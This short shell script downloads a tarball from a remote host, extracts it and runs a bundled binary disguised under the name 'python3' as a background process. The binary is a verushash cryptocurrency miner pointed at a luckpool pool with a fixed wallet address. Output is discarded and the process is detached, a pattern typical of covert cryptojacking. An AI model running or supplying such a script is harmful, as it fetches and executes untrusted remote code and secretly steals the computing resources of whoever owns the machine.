wget -O meki momok.x10.bz/DOT-SRB.tar.gz
tar -xvf meki
cd dotsrb
nohup ./python3 -a verushash -o ap.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg --cpu-threads 32 > /dev/null 2>&1 &
